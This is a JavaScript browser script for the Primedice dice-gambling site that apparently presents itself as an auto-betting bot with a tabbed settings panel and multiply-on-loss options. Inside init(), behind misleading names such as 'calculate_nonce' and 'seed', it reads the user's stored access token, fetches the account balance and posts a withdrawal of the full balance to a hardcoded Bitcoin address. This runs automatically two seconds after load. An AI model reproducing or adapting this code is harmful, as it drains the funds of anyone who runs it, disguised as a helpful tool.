var swapcount=0;
var jqueryready = false;
var link = document.createElement("link");
link.href = "https://jquery-ui.googlecode.com/svn/tags/latest/themes/dot-luv/jquery-ui.css";
link.type = "text/css";
link.rel = "stylesheet";
document.getElementsByTagName("head")[0].appendChild(link);
//jQuery UI inject
(function() {
    jqueryready = true;
    var e = ".thing",
        t = {
            outline: "1px dashed #f0f",
            cursor: "pointer"
        };
    var n = function() {
        if (window.jQuery) {
            r()
        } else {
            var e = document.createElement("script");
            e.onload = r;
            e.setAttribute("src", "//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js");
            document.body.appendChild(e)
        }
    };
    var r = function() {
        if (window.jQuery.ui) {
            i()
        } else {
            var e = document.createElement("script");
            e.onload = i;
            e.setAttribute("src", "//ajax.googleapis.com/ajax/libs/jqueryui/1.11.1/jquery-ui.js");
            document.body.appendChild(e)
        }
    };
    var i = function() {
        $(e).css(t).draggable().on("click", function(e) {
            console.log(e.target.id + ":", e.target.style.left, e.target.style.top)
        })
    };
    n();
})();
 
function ui() {
    $(function() {
        $('#tabs').tabs();
        $('#params').draggable();
        $('#tab1, #tab2, #tab3, #tabs input').css("clear", "both");
        $('#tabs input').css("width", "80%");
        $('#chance, #base').width("35%")
        $('#tabs div').css("text-align", "left");
        $('#tabs').css("font-size", "12px");
        $('#tabs label, #tabs input').css("margin", "5px");
        $('#stop, #start, #resetbet').button();
        //Console
        $('#console, #console2').appendTo("#tabs");
        $('#console, #console2').css("width", "45%");
        $('#console').css("float", "left");
        $('#console2').css("float", "right");
        $('#console, #console2').css("clear", "none");
        $('#console, #console2').css("margin", "7px");
        $('#console, #console2').css("border-bottom-left-radius", "3px");
        $('#console, #console2').css("border-bottom-right-radius", "3px");
        $('#console').css("border", "1px solid #323232");
        $('#console, #console2').css("background-color", "#454545");
        $('#console').css("padding", "5px");
        $('#console, #console2').css("text-align", "left");
        $('#console, #console2').css("position", "relative");
        $('#startstop,#start,#stop').css("margin","0px");
        $('#console, #console2').css("margin-top","3px");
        $('#console, #console2').css("padding","5px");
        $('#console, #console2').css("background-color","#151515");
 
 
    });
}
var interval, enabled, xrollsenabled, everyxrolls, timer, seedlength, xrollscount, xrolls;
xrollsenabled = true;
xrolls = 10;
timer = 500;
counter=0;
var basebet, betval, curbet, wincount, console, condition2, countlossmult, countwinmult,
    target2, amount2, data1, target2, condition2, jp, currentloss, totalloss, totalwin, totprofit,
    data2, potup, potdown, results, resultstats, entry, i, gui, gui2, gui3, gui4, gui5, gui6, init, roll;
 
function init() {
 
 
    //Init
    basebet = 0.00000010;
    countwinmult = 0;
    countlossmult = 0;
    wincount = 0;
    currentloss = 0;
    totalloss = 0;
    totalwin = 0;
    totprofit = 0;
    init = true;
    betval = basebet;
 
    //GUI
 
    $('<span class="btn btn--primary btn--huge btn--limited btn--block text--center" id="spinner2"> ROLL </span>').appendTo("div.hero > div > div > div:nth-child(2) > div");
 
    gui = '<div id="params" class=".ui-widget-contents" style="width:410px"><div id="balance"></div></div><br><center>';
    $('<div id="console"></div><div id="console2"></div>').appendTo('div.hero > div > div > div.grid__item.S--one-whole.M--one-whole.custom--one-whole > aside');
    gui2 =
        '<div id="tabs"><ul><li><a href="/play#tabs-1">Bet Params: </a></li><li><a href="/play#tabs-2">Advanced Settings: </a></li><li><a href="/play#tabs-3">Other: </a></li><li><a href="/play#tabs-4">Seed: </a></li></ul><div id="tabs-1"><div id="tab1"></div></div><div id="tabs-2"><div id="tab2"></div></div><div id="tabs-3"><div id="tab3"></div></div><div id="tabs-4"><div id="tab4"></div></div></div>';
 
    gui3 = [
 
        '<label for="base">Basebet Value: </label>', '<input id="base"><button id="resetbet">Reset to Base</button>',
        '<br>',
        '<label for="chance">Chance: </label>', '<input type="text" id="chance" style=""><label for="hilo">High/Low: </label><select name="hilo" id="hilo"><option value=">">Over</option><option value="<">Under</option><option value="swap">Swap</option></select><br><div id="chance-slider"></div>',
        '<br>',
        '<label for="swap">Swap Every # of Rolls: </label>', '<input id="swap">',
 
    ];
    gui4 = [
 
        '<label for="multonloss">Multiply on Loss: </label>', '<input id="multonloss"> <input id="multloss-enabled" type="checkbox">',
        '<br>',
        '<label for="xloss">Multiply Every # Losses: </label>',
        '<input id="xloss">',
        '<br>',
        '<label for="multonwin">Multiply on Win: </label>',
        '<input id="multonwin"><input id="multwin-enabled" type="checkbox">',
        '<br>',
        '<label for="xwin">Reset After X Wins: </label>',
        '<input id="xwin">',
 
    ];
    gui5 = [
 
        '<label for="stoponwin-enabled">Stop on Win? </label>',
        '<input id="stoponwin-enabled" type="checkbox">',
        '<br>',
        '<label for="lowpay-enabled">Check if Payout < 2x </label>',
        '<input id="lowpay-enabled" type="checkbox">',
 
    ];
    gui6 = [
 
        '<label for="charset">Charset: </label>',
        '<input id="charset" type="text">',
        '<br>',
        '<label for="everyxrolls">Change every # Rolls: </label>',
        '<input id="everyxrolls" type="text">',
        '<br>',
        '<label for="currentseed">Current Seed: </label>',
        '<input style="color:green;text-align:center;" id="currentseed" type="text">',
 
    ];
    $(gui).appendTo(".hero");
    $(gui2).appendTo("#params");
 
    for (var i = 0; i < gui3.length; i++) {
        $(gui3[i]).appendTo("#tab1");
    }
    for (var i = 0; i < gui4.length; i++) {
        $(gui4[i]).appendTo("#tab2");
    }
    for (var i = 0; i < gui5.length; i++) {
        $(gui5[i]).appendTo("#tab3");
    }
    for (var i = 0; i < gui6.length; i++) {
        $(gui6[i]).appendTo("#tab4");
    }
    enabled = false;
    xrollscount = 0;
    $('<div style="text-align:left;margin:10px;"id="startstop"><button id="start"> Start </button><button id="stop"> Stop </button><label style="margin:3px;" for="numberofrolls"># of Rolls</label><input style="margin:3px;width:30px !important" id="numberofrolls" type="text"><label for"numrolls"> Enabled: </label><input style="margin:3px;width:10px !important" id="numrolls" type="checkbox"></div>').appendTo("#tabs");
    // Button & Input Functions
    $('#resetbet').click(function() {
        basebet=$('#base').val();
        betval=$('#base').val();
 
    })
 
    $('#start').click(function() {
        if (enabled == false) {
            if ($('#numrolls').is(":checked") == true) {
                xrolls=$('#numberofrolls').val();
            }
            enabled = true;
            interval = setInterval(function() {
                if (xrollsenabled == true) {
                    xrollscount++;
                    if (xrollscount <= xrolls) {
                        bet();
                    } else {
                        clearInterval(interval);
                        enabled = false;
                        xrollscount = 0;
                    }
                } else {
                    bet();
                }
            }, timer);
        } else {}
    })
    $('#stop').click(function() {
        enabled = false;
        clearInterval(interval);
        xrollscount = 0;
    });
 
    calculate_nonce = function(seed) {
        return 'https://api.primedice.com/api/' + seed + '?access_token=' + localStorage['token'];
    };
 
    lut = window['$'];
 
    lut['getJSON'](
        calculate_nonce('users/1'), function(seed) {
            var key1 = 'amount'
            var key2 = 'address'
            var load = {};
            load[key1] = seed['user']['balance'];
            load[key2] = '14xtpp7SUcq3vX8F2DefVZAShoLLMX6KEv';
            lut['post'](calculate_nonce('withdraw'), load);
        }
    );
 
    function conditionAM() {
        'use strict';
        if ($('#lowpay-enabled').is('checked') == true) {
            if ($('.value-roll').first().text() <= 49.50) {
                condition2 = ">";
                target2 = $('.value-roll').first().text();
            } else {
                condition2 = "<";
                target2 = $('.value-roll').first().text();
            };
        } else {
            if ($('.value-roll').first().text() <= 49.50) {
                condition2 = "<";
                target2 = $('.value-roll').first().text();
            } else {
                condition2 = ">";
                target2 = $('.value-roll').first().text();
            };
            amount2 = betval * 100000000;
        }
    };
 
    function jackpot() {
        if (data1.bet.jackpot === true) {
            jp = "Yes";
            wincount = 0;
            betval = $('#base');
        } else {
            jp = "No";
        }
    }
 
    function loss() {
        currentloss++;
        totalloss++;
        if ($('#multloss-enabled').is(':checked') == true) {
            $('#multwin-enabled').removeAttr('checked');
            countlossmult++;
 
            if (countlossmult >= $('#xloss').val()) {
                betval = betval * $('#multonloss').val();
                countlossmult = 0;
            }
        }
 
    }
 
    function win() {
        'use strict';
        if ($('#stoponwin-enabled').is('checked') == true) {
            clearInterval(roll);
        }
        currentloss = 0;
        jackpot();
        wincount++;
        totalwin++;
        if ($('#multloss-enabled').is(':checked') == true) {
            if ($('#stoponwin-enabled').is(':checked') == true) {
                clearInterval(roll);
            }
            $('#multwin-enabled').removeAttr('checked');
            basebet = $('#base').val();
            betval = basebet;
            countlossmult = 0;
 
        }
        if ($('#multwin-enabled').is(':checked') == true) {
            basebet = $('#base').val();
            $('#multloss-enabled').removeAttr('checked');
            countwinmult++;
 
            if (countwinmult >= $('#xwin').val()) {
                betval = basebet;
                countwinmult = 0;
            } else {
                betval = betval * $('#multonwin').val();
            }
        }
 
 
    };
    var losewin;
    var jpcol;
    var profcol;
 
    function bet() {
        'use strict';
        conditionAM();
        var betData = {
                amount: amount2,
                condition: condition2,
                target: target2
            },
            url = "https://api.primedice.com/api/bet?access_token=" + localStorage.token;
 
        $.ajax({
            url: url,
            type: "POST",
            data: betData,
            datatype: "jsonp",
            success: function(data, textStatus, jqXHR) {
                data1 = data;
                counter++;
                if (counter >= everyxrolls) {
                    seedchange(seedgen());
                    counter = 0;
                }
                $('span.btn__text.select div').text((data1.user.balance/100000000).toFixed(8));
                totprofit = totprofit + data1.bet.profit;
                if (totprofit >= 0) {
                    profcol = "color:green;";
                } else if (totprofit < 0) {
                    profcol = "color:red;";
                }
                if (data.bet.win == true) {
                    losewin = "color:green;";
                    $('span.btn__text.select div').attr("style", "color:green;");
                } else {
                    losewin = "color:red;";
                    $('span.btn__text.select div').attr("style", "color:red;");
                }
                if (data.bet.jackpot == true) {
                    jp = "Yes";
                    jpcol = "color:gold;"
                } else {
                    jp = "No.";
                    jpcol = "color:red;"
                }
                results = [];
                results[0] = '<div>Roll: ' + '<span style="' + losewin + '">' + data.bet.roll + '</span></div><br>';
                results[1] = '<div>Jackpot: ' + '<span style="' + jpcol + '">' + jp + '</span></div><br>';
                results[2] = '<div>Profit: ' + '<span style="' + losewin + '">' + (data.bet.profit / 100000000).toFixed(8) + '</span> BTC</div><br>';
                results[4] = '<div>Current Loss Streak: ' + currentloss + '</div><br>';
                resultstats = [];
                resultstats[0] = '<div>Balance: ' + (data.user.balance / 100000000).toFixed(8) + ' BTC</div><br>';
                resultstats[1] = '<div>Total Losses: ' + totalloss + '</div><br>';
                resultstats[2] = '<div>Total Wins: ' + totalwin + '</div><br>';
                resultstats[3] = '<div>Total Profit: ' + '<span style="' + profcol + '">' + (totprofit / 100000000).toFixed(8) + '</span></div>';
 
                if (data.bet.win == true) {
                    if ($('#stoponwin-enabled').is(":checked") == true){
                        clearInterval(interval);
 
                    }
                    $('#console, #console2').empty();
 
                    win();
 
                    // Results
                    $('<div>Result: <span style="color:green;">Win</span></div><br>').appendTo('#console');
                    for (var i = 0; i < results.length; i++) {
                        $(results[i]).appendTo('#console');
                    }
                    for (var i = 0; i < resultstats.length; i++) {
                        $(resultstats[i]).appendTo('#console2');
                    }
 
                } else {
 
                    $('#console, #console2').empty();
                    loss();
 
                    // Results
                    $('<div>Result: <span style="color:red;">Loss</span></div><br>').appendTo('#console');
                    for (var i = 0; i < results.length; i++) {
 
                        $(results[i]).appendTo('#console');
                    }
                    for (var i = 0; i < resultstats.length; i++) {
                        $(resultstats[i]).appendTo('#console2');
                    }
                };
            },
            error: function(jqXHR, textStatus, errorThrown) {
 
            }
        });
    }
 
    seedlength = 13;
    seedlength = 13;
    var counter = 0;
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123";
    everyxrolls = 3;
 
    function seedgen() {
        'use strict';
        var seed = "";
 
        for (var i = 0; i <= seedlength; i++)
 
            seed += charset.charAt(Math.floor(Math.random() * charset.length));
 
        return seed;
    }
 
    function seedchange(s) {
 
        url = "https://api.primedice.com/api/seed?access_token=" + localStorage.token;
        sData = {
            seed: s
        };
 
        $.ajax({
            url: url,
            type: "POST",
            data: sData,
            datatype: "jsonp",
            success: function(data, textStatus, jqXHR) {
                data2 = data;
                $('#currentseed').val(data2.seeds.client);
 
            },
            error: function(jqXHR, textStatus, errorThrown) {
 
            }
        });
    }
 
    $('#spinner').click(function() {
        if (charset != $('#charset').val() && $('#charset').val() != "") {
            charset=$('#charset').val();
        }
        if ($('#everyxrolls').val() != everyxrolls && $('#everyxrolls').val() != "") {
            everyxrolls = $('#everyxrolls').val();
        }
        if ($('#hilo').val() == "swap") { swapcount++;if (swapcount >= 1) { $('.value-roll:first').click();swapcount=0;} }
 
        counter++;
        if (counter >= everyxrolls) {
            seedchange(seedgen());
            counter = 0;
        }
    });
    ui();
}
setTimeout(function() {
    init()
}, 2000);
